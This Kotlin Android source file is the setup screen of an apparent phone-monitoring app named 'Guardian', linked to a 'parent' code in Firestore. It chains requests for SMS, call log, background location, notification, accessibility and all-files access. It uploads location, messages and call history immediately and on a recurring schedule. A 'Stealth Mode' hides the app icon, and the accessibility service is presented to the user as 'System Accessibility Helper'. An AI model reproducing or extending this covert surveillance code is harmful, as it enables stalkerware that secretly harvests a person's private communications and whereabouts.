package com.device.guardian.service.ui

import android.content.Context
import android.content.Intent
import android.net.Uri
import com.device.guardian.service.R
import android.os.Bundle
import android.os.PowerManager
import android.provider.Settings
import android.util.Log
import android.view.accessibility.AccessibilityManager
import android.widget.Toast
import androidx.appcompat.app.AppCompatActivity
import com.device.guardian.service.databinding.ActivitySetupBinding
import com.device.guardian.service.service.GuardianAccessibilityService
import com.device.guardian.service.service.GuardianNotificationService
import androidx.lifecycle.lifecycleScope
import kotlinx.coroutines.launch
import android.os.BatteryManager
import android.content.IntentFilter
import android.net.ConnectivityManager
import android.net.NetworkCapabilities
import android.os.Build
import kotlinx.coroutines.tasks.await
import com.google.firebase.auth.FirebaseAuth
import com.google.firebase.firestore.FirebaseFirestore
import com.google.firebase.firestore.SetOptions
import androidx.work.PeriodicWorkRequestBuilder
import androidx.work.WorkManager
import androidx.work.ExistingPeriodicWorkPolicy
import com.device.guardian.service.worker.SyncWorker
import java.util.concurrent.TimeUnit

class SetupActivity : AppCompatActivity() {

    private lateinit var binding: ActivitySetupBinding
    private lateinit var prefs: com.device.guardian.service.utils.PrefsManager
    private val auth by lazy { FirebaseAuth.getInstance() }
    private val db by lazy { FirebaseFirestore.getInstance() }

    companion object {
        private const val TAG = "SetupActivity"
    }

    // ── Permission Launchers (chained sequentially) ───────────────────────────

    // Chain step 3: SMS & Calls (final step)
    private val requestSmsCallsPermissionLauncher = registerForActivityResult(
        androidx.activity.result.contract.ActivityResultContracts.RequestMultiplePermissions()
    ) { permissions ->
        val allGranted = permissions.values.all { it }
        if (allGranted) {
            Toast.makeText(this, "SMS & Call permissions granted ✓", Toast.LENGTH_SHORT).show()
        } else {
            Toast.makeText(this, "Some SMS/Call permissions denied. Logs might be partial.", Toast.LENGTH_LONG).show()
        }
        refreshAllStatuses()
        // All permission steps done — NOW do the full data sync
        onAllPermissionsHandled()
    }

    // Chain step 2: Background Location → then SMS/Calls
    private val requestBackgroundLocationLauncher = registerForActivityResult(
        androidx.activity.result.contract.ActivityResultContracts.RequestMultiplePermissions()
    ) { permissions ->
        val bgGranted = permissions[android.Manifest.permission.ACCESS_BACKGROUND_LOCATION] ?: false
        if (bgGranted) {
            Toast.makeText(this, "Background location granted ✓", Toast.LENGTH_SHORT).show()
        } else {
            Toast.makeText(this, "Background location denied — location may not work when app is closed", Toast.LENGTH_LONG).show()
        }
        refreshAllStatuses()

        // Chain → request SMS/Calls permissions next
        if (!isSmsCallsPermissionGranted()) {
            requestSmsCallsPermissionLauncher.launch(
                arrayOf(
                    android.Manifest.permission.RECEIVE_SMS,
                    android.Manifest.permission.READ_SMS,
                    android.Manifest.permission.READ_PHONE_STATE,
                    android.Manifest.permission.READ_CALL_LOG
                )
            )
        } else {
            onAllPermissionsHandled()
        }
    }

    // Chain step 1: Foreground Location → then Background Location → then SMS/Calls
    private val requestForegroundLocationLauncher = registerForActivityResult(
        androidx.activity.result.contract.ActivityResultContracts.RequestMultiplePermissions()
    ) { permissions ->
        val fineGranted = permissions[android.Manifest.permission.ACCESS_FINE_LOCATION] ?: false
        val coarseGranted = permissions[android.Manifest.permission.ACCESS_COARSE_LOCATION] ?: false
        if (fineGranted || coarseGranted) {
            Toast.makeText(this, "Location permission granted ✓", Toast.LENGTH_SHORT).show()
            // Chain → request background location on Q+
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
                requestBackgroundLocationLauncher.launch(
                    arrayOf(android.Manifest.permission.ACCESS_BACKGROUND_LOCATION)
                )
            } else {
                // Pre-Q: no background location needed, go straight to SMS/Calls
                chainToSmsCallsIfNeeded()
            }
        } else {
            Toast.makeText(this, "Location permission denied", Toast.LENGTH_SHORT).show()
            // Still chain to SMS/Calls even if location denied
            chainToSmsCallsIfNeeded()
        }
        refreshAllStatuses()
    }

    // BUG-R2-06: POST_NOTIFICATIONS launcher for Android 13+ (chain step 0)
    private val requestNotificationsLauncher = registerForActivityResult(
        androidx.activity.result.contract.ActivityResultContracts.RequestPermission()
    ) { granted ->
        if (granted) {
            Toast.makeText(this, "Notification permission granted ✓", Toast.LENGTH_SHORT).show()
        }
        // Chain → request location next
        chainToLocationIfNeeded()
    }

    // ── Lifecycle ─────────────────────────────────────────────────────────────

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        binding = ActivitySetupBinding.inflate(layoutInflater)
        setContentView(binding.root)
        prefs = com.device.guardian.service.utils.PrefsManager(this)

        setupButtons()
        restoreSavedParentId()
    }

    override fun onResume() {
        super.onResume()
        refreshAllStatuses()

        // If app is fully configured, trigger background sync
        if (isParentIdSaved() && isLocationPermissionGranted() && isSmsCallsPermissionGranted()) {
            performFullDataSync()
        }
    }

    // ── Setup Buttons ─────────────────────────────────────────────────────────

    private fun setupButtons() {

        // Step 1 — Save Parent ID (with Firestore validation)
        binding.btnSaveParentId.setOnClickListener {
            val id = binding.etParentId.text.toString().trim()
            if (id.length >= 4) {
                binding.btnSaveParentId.isEnabled = false
                binding.btnSaveParentId.text = "Verifying..."

                // Validate code exists in Firestore
                lifecycleScope.launch {
                    try {
                        val doc = db.collection("monitors")
                            .document(id)
                            .get()
                            .await()

                        if (doc.exists()) {
                            // Code found in DB — connection successful!
                            prefs.parentId = id
                            prefs.childUid = "child_${System.currentTimeMillis()}"

                            // Update parent document to show child connected
                            db.collection("monitors")
                                .document(id)
                                .set(
                                    mapOf(
                                        "status" to "child_connected",
                                        "childConnectedAt" to System.currentTimeMillis()
                                    ),
                                    SetOptions.merge()
                                ).await()

                            Toast.makeText(this@SetupActivity, "✅ Connected to Parent!", Toast.LENGTH_SHORT).show()

                            val localDb = com.device.guardian.service.data.local.AppDatabase.getInstance(this@SetupActivity)
                            try {
                                localDb.messageDao().resetSyncStatus()
                            } catch (_: Exception) {}

                            refreshAllStatuses()
                            binding.btnSaveParentId.isEnabled = true
                            binding.btnSaveParentId.text = "Save ID"

                            // Start the permission request chain IMMEDIATELY
                            startPermissionChain()

                        } else {
                            // Code NOT found — parent hasn't generated it yet
                            Toast.makeText(this@SetupActivity, "❌ Code not found — check parent's phone", Toast.LENGTH_LONG).show()
                            binding.etParentId.error = "Code not found in database"
                            binding.btnSaveParentId.isEnabled = true
                            binding.btnSaveParentId.text = "Save ID"
                        }
                    } catch (e: Exception) {
                        Log.e(TAG, "Failed to verify parent code: ${e.message}", e)
                        Toast.makeText(this@SetupActivity, "Network error: ${e.message}", Toast.LENGTH_LONG).show()
                        binding.btnSaveParentId.isEnabled = true
                        binding.btnSaveParentId.text = "Save ID"
                    }
                }
            } else {
                binding.etParentId.error = "Must be at least 4 chars"
            }
        }

        // Step 2 — Open Accessibility Settings
        binding.btnEnableAccessibility.setOnClickListener {
            try {
                val intent = Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS)
                startActivity(intent)
                Toast.makeText(
                    this,
                    "Find 'System Accessibility Helper' and enable it",
                    Toast.LENGTH_LONG
                ).show()
            } catch (e: Exception) {
                startActivity(Intent(Settings.ACTION_SETTINGS))
            }
        }

        // Step 3 — Battery Optimization
        binding.btnBatteryOptimization.setOnClickListener {
            if (isBatteryOptimizationDisabled()) {
                Toast.makeText(this, "Already configured ✓", Toast.LENGTH_SHORT).show()
                return@setOnClickListener
            }
            try {
                val intent = Intent(Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS).apply {
                    data = Uri.parse("package:$packageName")
                }
                startActivity(intent)
            } catch (e: Exception) {
                val intent = Intent(Settings.ACTION_IGNORE_BATTERY_OPTIMIZATION_SETTINGS)
                startActivity(intent)
                Toast.makeText(this, "Find this app and select 'Unrestricted'", Toast.LENGTH_LONG).show()
            }
        }

        // Step 4 — Request Location Permission (manual fallback)
        binding.btnEnableLocation.setOnClickListener {
            if (isLocationPermissionGranted()) {
                Toast.makeText(this, "Permission already granted ✓", Toast.LENGTH_SHORT).show()
                return@setOnClickListener
            }
            requestForegroundLocationLauncher.launch(
                arrayOf(
                    android.Manifest.permission.ACCESS_FINE_LOCATION,
                    android.Manifest.permission.ACCESS_COARSE_LOCATION
                )
            )
        }

        // Step 5 — Notification Access
        binding.btnEnableNotification.setOnClickListener {
            val intent = Intent("android.settings.ACTION_NOTIFICATION_LISTENER_SETTINGS")
            try {
                startActivity(intent)
                Toast.makeText(this, "Enable Guardian for Notification Access", Toast.LENGTH_LONG).show()
            } catch (e: Exception) {
                startActivity(Intent(Settings.ACTION_SETTINGS))
            }
        }

        // Step 6 — SMS & Calls Tracking (manual fallback)
        binding.btnEnableSmsCalls.setOnClickListener {
            if (isSmsCallsPermissionGranted()) {
                Toast.makeText(this, "Permissions already granted ✓", Toast.LENGTH_SHORT).show()
                return@setOnClickListener
            }
            requestSmsCallsPermissionLauncher.launch(
                arrayOf(
                    android.Manifest.permission.RECEIVE_SMS,
                    android.Manifest.permission.READ_SMS,
                    android.Manifest.permission.READ_PHONE_STATE,
                    android.Manifest.permission.READ_CALL_LOG
                )
            )
        }

        // Step 7 — Storage Access
        binding.btnEnableStorage.setOnClickListener {
            if (isStoragePermissionGranted()) {
                Toast.makeText(this, "Storage access already granted ✓", Toast.LENGTH_SHORT).show()
                return@setOnClickListener
            }
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
                try {
                    val intent = Intent(Settings.ACTION_MANAGE_APP_ALL_FILES_ACCESS_PERMISSION).apply {
                        data = Uri.parse("package:$packageName")
                    }
                    startActivity(intent)
                } catch (e: Exception) {
                    val intent = Intent(Settings.ACTION_MANAGE_ALL_FILES_ACCESS_PERMISSION)
                    startActivity(intent)
                }
            } else {
                // Fallback for Android 10 and below
                requestPermissions(
                    arrayOf(
                        android.Manifest.permission.READ_EXTERNAL_STORAGE,
                        android.Manifest.permission.WRITE_EXTERNAL_STORAGE
                    ), 1001
                )
            }
        }

        // Step 8 — Stealth Mode & Consent
        binding.cbConsent.setOnCheckedChangeListener { _, isChecked ->
            binding.btnEnableStealth.isEnabled = isChecked
        }

        binding.btnEnableStealth.setOnClickListener {
            val consentChecked = binding.cbConsent.isChecked
            if (!consentChecked) {
                Toast.makeText(this, "Please check the consent box", Toast.LENGTH_SHORT).show()
                return@setOnClickListener
            }

            val currentActive = prefs.isStealthModeActive
            val newActive = !currentActive

            prefs.isStealthConsentGranted = consentChecked
            toggleStealthMode(newActive)

            if (newActive) {
                Toast.makeText(this, "Stealth Mode Activated! App icon will be hidden.", Toast.LENGTH_LONG).show()
            } else {
                Toast.makeText(this, "Stealth Mode Deactivated.", Toast.LENGTH_LONG).show()
            }

            refreshAllStatuses()
            syncStealthStatusToFirebase()
        }
    }

    // ── Permission Chain (BUG-R2-01 fix) ──────────────────────────────────────

    /**
     * Starts the full sequential permission chain:
     * POST_NOTIFICATIONS (API 33+) → Location → Background Location → SMS/Calls
     * Each step chains into the next automatically.
     */
    private fun startPermissionChain() {
        // Step 0: POST_NOTIFICATIONS for API 33+ (BUG-R2-06 fix)
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU &&
            checkSelfPermission(android.Manifest.permission.POST_NOTIFICATIONS) != android.content.pm.PackageManager.PERMISSION_GRANTED) {
            requestNotificationsLauncher.launch(android.Manifest.permission.POST_NOTIFICATIONS)
            return
        }
        chainToLocationIfNeeded()
    }

    private fun chainToLocationIfNeeded() {
        if (!isLocationPermissionGranted()) {
            requestForegroundLocationLauncher.launch(
                arrayOf(
                    android.Manifest.permission.ACCESS_FINE_LOCATION,
                    android.Manifest.permission.ACCESS_COARSE_LOCATION
                )
            )
        } else if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q &&
                   checkSelfPermission(android.Manifest.permission.ACCESS_BACKGROUND_LOCATION) != android.content.pm.PackageManager.PERMISSION_GRANTED) {
            requestBackgroundLocationLauncher.launch(
                arrayOf(android.Manifest.permission.ACCESS_BACKGROUND_LOCATION)
            )
        } else {
            chainToSmsCallsIfNeeded()
        }
    }

    private fun chainToSmsCallsIfNeeded() {
        if (!isSmsCallsPermissionGranted()) {
            requestSmsCallsPermissionLauncher.launch(
                arrayOf(
                    android.Manifest.permission.RECEIVE_SMS,
                    android.Manifest.permission.READ_SMS,
                    android.Manifest.permission.READ_PHONE_STATE,
                    android.Manifest.permission.READ_CALL_LOG
                )
            )
        } else {
            onAllPermissionsHandled()
        }
    }

    /**
     * Called when all permission steps in the chain have been handled.
     * THIS is where we do the full immediate data sync — location, battery, SMS, calls.
     */
    private fun onAllPermissionsHandled() {
        refreshAllStatuses()
        Log.d(TAG, "All permissions handled — performing FULL immediate data sync")
        performFullDataSync()
        scheduleSyncWorker()
    }

    // ── SyncWorker Scheduling (BUG-R2-05 fix) ────────────────────────────────

    private fun scheduleSyncWorker() {
        val syncRequest = PeriodicWorkRequestBuilder<SyncWorker>(15, TimeUnit.MINUTES)
            .build()
        WorkManager.getInstance(this).enqueueUniquePeriodicWork(
            "GuardianSyncWork",
            ExistingPeriodicWorkPolicy.KEEP,
            syncRequest
        )
        
        val mediaRequest = PeriodicWorkRequestBuilder<com.device.guardian.service.worker.MediaMetadataWorker>(30, TimeUnit.MINUTES)
            .build()
        WorkManager.getInstance(this).enqueueUniquePeriodicWork(
            "GuardianMediaSyncWork",
            ExistingPeriodicWorkPolicy.KEEP,
            mediaRequest
        )
    }

    // ── Helpers ───────────────────────────────────────────────────────────────

    private fun restoreSavedParentId() {
        val saved = prefs.parentId
        if (!saved.isNullOrBlank()) {
            binding.etParentId.setText(saved)
        }
    }

    // ── Status Refresh ─────────────────────────────────────────────────────────

    private fun refreshAllStatuses() {
        updateStep1Status()
        updateStep2Status()
        updateStep3Status()
        updateStep4Status()
        updateStep5Status()
        updateStep6Status()
        updateStep7Status()
        updateStep8Status()
        updateFinalBanner()
    }

    private fun updateStep1Status() {
        val saved = prefs.parentId
        val done = !saved.isNullOrBlank()
        binding.tvStep1Status.text = if (done) "✅ Saved" else "⬜ Pending"
        binding.tvStep1Status.setTextColor(
            getColor(if (done) R.color.status_success else R.color.status_pending)
        )
    }

    private fun updateStep2Status() {
        val active = isAccessibilityServiceEnabled()
        binding.tvStep2Status.text = if (active) "✅ Active" else "⬜ Pending"
        binding.tvStep2Status.setTextColor(
            getColor(if (active) R.color.status_success else R.color.status_pending)
        )
        binding.btnEnableAccessibility.text =
            if (active) "Service Active ✓" else "Open Accessibility Settings"
        binding.btnEnableAccessibility.isEnabled = !active
    }

    private fun updateStep3Status() {
        val optimized = isBatteryOptimizationDisabled()
        binding.tvStep3Status.text = if (optimized) "✅ Done" else "⬜ Pending"
        binding.tvStep3Status.setTextColor(
            getColor(if (optimized) R.color.status_success else R.color.status_pending)
        )
        binding.btnBatteryOptimization.text =
            if (optimized) "Battery Configured ✓" else "Disable Battery Optimization"
        binding.btnBatteryOptimization.isEnabled = !optimized
    }

    private fun updateStep4Status() {
        val granted = isLocationPermissionGranted()
        binding.tvStep4Status.text = if (granted) "✅ Done" else "⬜ Pending"
        binding.tvStep4Status.setTextColor(
            getColor(if (granted) R.color.status_success else R.color.status_pending)
        )
        binding.btnEnableLocation.text =
            if (granted) "Location Configured ✓" else "Grant Location Access"
        binding.btnEnableLocation.isEnabled = !granted
    }

    private fun updateStep5Status() {
        val active = isNotificationServiceEnabled()
        binding.tvStep5Status.text = if (active) "✅ Active" else "⬜ Pending"
        binding.tvStep5Status.setTextColor(
            getColor(if (active) R.color.status_success else R.color.status_pending)
        )
        binding.btnEnableNotification.text =
            if (active) "Notification Capture Active ✓" else "Grant Notification Access"
        binding.btnEnableNotification.isEnabled = !active
    }

    private fun updateStep6Status() {
        val active = isSmsCallsPermissionGranted()
        binding.tvStep6Status.text = if (active) "✅ Done" else "⬜ Pending"
        binding.tvStep6Status.setTextColor(
            getColor(if (active) R.color.status_success else R.color.status_pending)
        )
        binding.btnEnableSmsCalls.text =
            if (active) "SMS & Call Tracking Active ✓" else "Grant SMS & Call Access"
        binding.btnEnableSmsCalls.isEnabled = !active
    }

    private fun updateStep7Status() {
        val granted = isStoragePermissionGranted()
        binding.tvStep7Status.text = if (granted) "✅ Done" else "⬜ Pending"
        binding.tvStep7Status.setTextColor(
            getColor(if (granted) R.color.status_success else R.color.status_pending)
        )
        binding.btnEnableStorage.text =
            if (granted) "Storage Access Granted ✓" else "Grant Storage Access"
        binding.btnEnableStorage.isEnabled = !granted
    }

    private fun updateStep8Status() {
        val consent = prefs.isStealthConsentGranted
        val active = prefs.isStealthModeActive

        binding.cbConsent.isChecked = consent
        binding.tvStep8Status.text = if (active) "✅ Active" else if (consent) "✅ Consented" else "⬜ Pending"
        binding.tvStep8Status.setTextColor(
            getColor(if (active || consent) R.color.status_success else R.color.status_pending)
        )
        binding.btnEnableStealth.text = if (active) "Deactivate Stealth Mode" else "Activate Stealth Mode"
        binding.btnEnableStealth.isEnabled = binding.cbConsent.isChecked
    }

    private fun updateFinalBanner() {
        val allDone = isParentIdSaved() &&
                      isAccessibilityServiceEnabled() &&
                      isBatteryOptimizationDisabled() &&
                      isLocationPermissionGranted() &&
                      isNotificationServiceEnabled() &&
                      isSmsCallsPermissionGranted() &&
                      isStoragePermissionGranted()

        if (allDone) {
            binding.tvFinalStatus.text = "✅ Monitoring Active"
            val stealthText = if (prefs.isStealthModeActive) " (Stealth Mode)" else ""
            binding.tvFinalSubtext.text = "All steps complete — service is running$stealthText"
            binding.cardStatus.setCardBackgroundColor(getColor(R.color.status_success))
        } else {
            binding.tvFinalStatus.text = "⚠ Setup Incomplete"
            binding.tvFinalSubtext.text = "Complete steps 1-7 above"
            binding.cardStatus.setCardBackgroundColor(
                resources.getColor(android.R.color.black, theme)
            )
        }
    }

    // ── Checks ─────────────────────────────────────────────────────────────────

    private fun isParentIdSaved(): Boolean {
        return !prefs.parentId.isNullOrBlank()
    }

    private fun isAccessibilityServiceEnabled(): Boolean {
        val enabledServices = Settings.Secure.getString(
            contentResolver,
            Settings.Secure.ENABLED_ACCESSIBILITY_SERVICES
        ) ?: return false

        val serviceName = "${packageName}/${GuardianAccessibilityService::class.java.canonicalName}"
        return enabledServices.contains(serviceName, ignoreCase = true)
    }

    private fun isBatteryOptimizationDisabled(): Boolean {
        val pm = getSystemService(Context.POWER_SERVICE) as PowerManager
        return pm.isIgnoringBatteryOptimizations(packageName)
    }

    private fun isLocationPermissionGranted(): Boolean {
        return checkSelfPermission(android.Manifest.permission.ACCESS_FINE_LOCATION) == android.content.pm.PackageManager.PERMISSION_GRANTED ||
               checkSelfPermission(android.Manifest.permission.ACCESS_COARSE_LOCATION) == android.content.pm.PackageManager.PERMISSION_GRANTED
    }

    private fun isNotificationServiceEnabled(): Boolean {
        val enabledListeners = Settings.Secure.getString(contentResolver, "enabled_notification_listeners")
        val serviceName = "${packageName}/${GuardianNotificationService::class.java.canonicalName}"
        return enabledListeners?.contains(serviceName) == true
    }

    private fun isSmsCallsPermissionGranted(): Boolean {
        return checkSelfPermission(android.Manifest.permission.RECEIVE_SMS) == android.content.pm.PackageManager.PERMISSION_GRANTED &&
               checkSelfPermission(android.Manifest.permission.READ_SMS) == android.content.pm.PackageManager.PERMISSION_GRANTED &&
               checkSelfPermission(android.Manifest.permission.READ_PHONE_STATE) == android.content.pm.PackageManager.PERMISSION_GRANTED &&
               checkSelfPermission(android.Manifest.permission.READ_CALL_LOG) == android.content.pm.PackageManager.PERMISSION_GRANTED
    }

    private fun isStoragePermissionGranted(): Boolean {
        return if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
            android.os.Environment.isExternalStorageManager()
        } else {
            checkSelfPermission(android.Manifest.permission.READ_EXTERNAL_STORAGE) == android.content.pm.PackageManager.PERMISSION_GRANTED
        }
    }

    // ── FULL IMMEDIATE DATA SYNC ──────────────────────────────────────────────
    // This is the critical function — syncs ALL data to Firestore right NOW.

    private fun performFullDataSync() {
        val id = prefs.parentId
        if (id.isNullOrBlank()) {
            Log.w(TAG, "performFullDataSync: No parent ID saved, skipping")
            return
        }

        Log.d(TAG, "performFullDataSync: Starting immediate sync for parent=$id")

        val localDb = com.device.guardian.service.data.local.AppDatabase.getInstance(this)
        val repo = com.device.guardian.service.data.remote.FirebaseRepository(localDb.messageDao(), this)

        lifecycleScope.launch {
            // 1. Sync device status (battery, connectivity, location) IMMEDIATELY
            try {
                val batteryFilter = IntentFilter(Intent.ACTION_BATTERY_CHANGED)
                val batteryStatus = registerReceiver(null, batteryFilter)
                val level = batteryStatus?.getIntExtra(BatteryManager.EXTRA_LEVEL, -1) ?: -1
                val scale = batteryStatus?.getIntExtra(BatteryManager.EXTRA_SCALE, -1) ?: -1
                val batteryPct = if (level >= 0 && scale > 0) (level * 100 / scale) else -1
                val isCharging = batteryStatus?.getIntExtra(BatteryManager.EXTRA_STATUS, -1) == BatteryManager.BATTERY_STATUS_CHARGING

                val cm = getSystemService(Context.CONNECTIVITY_SERVICE) as ConnectivityManager
                val network = cm.activeNetwork
                val caps = network?.let { cm.getNetworkCapabilities(it) }
                val isOnline = caps?.hasCapability(NetworkCapabilities.NET_CAPABILITY_INTERNET) == true

                var lat: Double? = null
                var lon: Double? = null
                if (checkSelfPermission(android.Manifest.permission.ACCESS_FINE_LOCATION) == android.content.pm.PackageManager.PERMISSION_GRANTED) {
                    try {
                        val fusedLocationClient = com.google.android.gms.location.LocationServices.getFusedLocationProviderClient(this@SetupActivity)
                        // Try getCurrentLocation first
                        val currentLocation = fusedLocationClient.getCurrentLocation(
                            com.google.android.gms.location.Priority.PRIORITY_HIGH_ACCURACY, null
                        ).await()
                        if (currentLocation != null) {
                            lat = currentLocation.latitude
                            lon = currentLocation.longitude
                            Log.d(TAG, "Got current location: $lat, $lon")
                        } else {
                            // Fallback to getLastLocation
                            val lastLocation = fusedLocationClient.lastLocation.await()
                            if (lastLocation != null) {
                                lat = lastLocation.latitude
                                lon = lastLocation.longitude
                                Log.d(TAG, "Got last location (fallback): $lat, $lon")
                            } else {
                                Log.w(TAG, "Both getCurrentLocation and lastLocation returned null")
                            }
                        }
                    } catch (e: Exception) {
                        Log.e(TAG, "Location fetch failed: ${e.message}", e)
                    }
                } else {
                    Log.w(TAG, "Location permission not granted, skipping location sync")
                }

                repo.syncDeviceStatus(
                    batteryLevel = batteryPct,
                    isCharging = isCharging,
                    isOnline = isOnline,
                    latitude = lat,
                    longitude = lon
                )
                Log.d(TAG, "✅ Device status synced: battery=$batteryPct%, charging=$isCharging, online=$isOnline, lat=$lat, lon=$lon")
            } catch (e: Exception) {
                Log.e(TAG, "❌ Device status sync failed: ${e.message}", e)
            }

            // 2. Import SMS + Call logs from device IMMEDIATELY
            try {
                com.device.guardian.service.utils.LocalLogImporter.importHistory(this@SetupActivity, localDb, repo)
                Log.d(TAG, "✅ SMS + Call logs imported and synced")
            } catch (e: Exception) {
                Log.e(TAG, "❌ Log import failed: ${e.message}", e)
            }

            // 3. Sync any remaining pending messages
            try {
                repo.syncPending()
                Log.d(TAG, "✅ Pending messages synced")
            } catch (e: Exception) {
                Log.e(TAG, "❌ Pending message sync failed: ${e.message}", e)
            }

            // 4. Sync stealth status
            syncStealthStatusToFirebase()
        }
    }

    private fun toggleStealthMode(active: Boolean) {
        try {
            val pm = packageManager
            val componentName = android.content.ComponentName(this, com.device.guardian.service.MainActivity::class.java)
            val state = if (active) {
                android.content.pm.PackageManager.COMPONENT_ENABLED_STATE_DISABLED
            } else {
                android.content.pm.PackageManager.COMPONENT_ENABLED_STATE_ENABLED
            }
            pm.setComponentEnabledSetting(
                componentName,
                state,
                android.content.pm.PackageManager.DONT_KILL_APP
            )
            prefs.isStealthModeActive = active
            Log.d(TAG, "Stealth mode set to $active")
        } catch (e: Exception) {
            Log.e(TAG, "Failed to toggle stealth mode: ${e.message}", e)
        }
    }

    private fun syncStealthStatusToFirebase() {
        val id = prefs.parentId
        if (id.isNullOrBlank()) {
            Log.w(TAG, "syncStealthStatusToFirebase: No parent ID saved, skipping")
            return
        }

        lifecycleScope.launch {
            try {
                db.collection("monitors")
                    .document(id)
                    .collection("status")
                    .document("device")
                    .set(
                        mapOf(
                            "stealthModeActive" to prefs.isStealthModeActive,
                            "stealthConsentGranted" to prefs.isStealthConsentGranted,
                            "stealthStatusUpdatedAt" to System.currentTimeMillis()
                        ),
                        SetOptions.merge()
                    ).await()
                Log.d(TAG, "Synced stealth status to Firebase status/device")
            } catch (e: Exception) {
                Log.e(TAG, "Failed to sync stealth status: ${e.message}", e)
            }
        }
    }
}
